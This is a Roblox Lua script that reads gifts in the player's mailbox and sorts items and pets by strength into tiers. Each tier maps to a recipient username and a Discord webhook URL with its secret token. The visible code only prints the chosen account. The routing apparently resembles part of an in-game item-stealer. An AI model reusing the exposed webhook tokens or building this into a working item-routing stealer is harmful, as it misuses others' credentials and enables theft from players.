_G.SpliterConfigs = {
    SPLIT_ITEM = {
        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307955690115174412/aVtvnSr7OG0EeEHkHIF6JDaARZt0hBBLyFDssd1N49HV7p_RqQrT01tm9rR6hg74jjPg",
        USER_ACCOUNT = "yfyqmxj_769628"
    },

    SPLIT_1M_20M = {
        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307955850912202773/Djx5sFXFzJLCvh0SzptOokP7tNUttxuTrTFJnbhZmqlsI3ZlcV53Z4iKXtUhcTwoKxul",
        USER_ACCOUNT = "jzvrurg_152179"
    },

    SPLIT_20M_50M = {
        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307955975348817991/5P9apewBcQA4VafVZoJAlRdXSqWZUUbtON95V628UHvHEczK5koSOqqt7I6JR5Xbpvkj",
        USER_ACCOUNT = "pwckmmb_s53423"
    },

    SPLIT_50M_100M = {
        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307956043439145002/eMhJ-RZM4LTHAng3x-w4zJFRLpDCwOYWRt317s_RHW59_BA6DU_031EV7866SC9PKLNR",
        USER_ACCOUNT = "yhmrkcw_e35970"
    },

    SPLIT_100M_10000B = {
        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307956126796484640/RWJzUvUfJwW44T27OxJMHOTuicXjKGMAkq0_cIT_GRPbf6D9OVpJi7E6m8_APbbkvAgM",
        USER_ACCOUNT = "eyhrpjo_332920"
    },
}

local player = game.Players.LocalPlayer
function split(str, delimiter)
    local result = {}
    for part in string.gmatch(str, "([^" .. delimiter .. "]+)") do
        table.insert(result, part)
    end
    return result
end
for i, v in pairs(
    player.PlayerGui._MACHINES.MailboxMachine.Frame.GiftsFrame.ItemsFrame:GetChildren()
) do
    local name = v.Name

    if not (name == "UIPadding" or name == "UIGridLayout") then
        local reciveName = v.Hidden.Present.Username.Text
        local StrengthPet = v.View.ItemHolder.ItemSlot.Strength.Text
        local Quantity = v.View.ItemHolder.ItemSlot.Quantity.Text:gsub("%a", "")
        
        local to_account = nil
        local to_webhook = nil
        
        -- itens (keys, poçoes, etc)
        if StrengthPet == "" then
            to_account = _G.SpliterConfigs.SPLIT_ITEM.USER_ACCOUNT
            to_webhook = _G.SpliterConfigs.SPLIT_ITEM.WEBHOOK_LINK
        else -- pets (>1m)
            local StrengthPetFilted = split(StrengthPet, "/")[2]:gsub("%a", ""):gsub(",", ".")
            -- pet 1m a 20m
            if tonumber(StrengthPetFilted) >= 1 and tonumber(StrengthPetFilted) < 20 then
                to_account = _G.SpliterConfigs.SPLIT_1M_20M.USER_ACCOUNT
                to_webhook = _G.SpliterConfigs.SPLIT_1M_20M.WEBHOOK_LINK
            end
            -- pet 20m a 50m
            if tonumber(StrengthPetFilted) >= 20 and tonumber(StrengthPetFilted) < 50 then
                to_account = _G.SpliterConfigs.SPLIT_20M_50M.USER_ACCOUNT
                to_webhook = _G.SpliterConfigs.SPLIT_20M_50M.WEBHOOK_LINK
            end
            if tonumber(StrengthPetFilted) >= 50 and tonumber(StrengthPetFilted) < 100 then
                to_account = _G.SpliterConfigs.SPLIT_50M_100M.USER_ACCOUNT
                to_webhook = _G.SpliterConfigs.SPLIT_50M_100M.WEBHOOK_LINK
            end
            if tonumber(StrengthPetFilted) >= 100 then
                to_account = _G.SpliterConfigs.SPLIT_100M_10000B.USER_ACCOUNT
                to_webhook = _G.SpliterConfigs.SPLIT_100M_10000B.WEBHOOK_LINK
            end
        end

        print(to_account)

    end
end
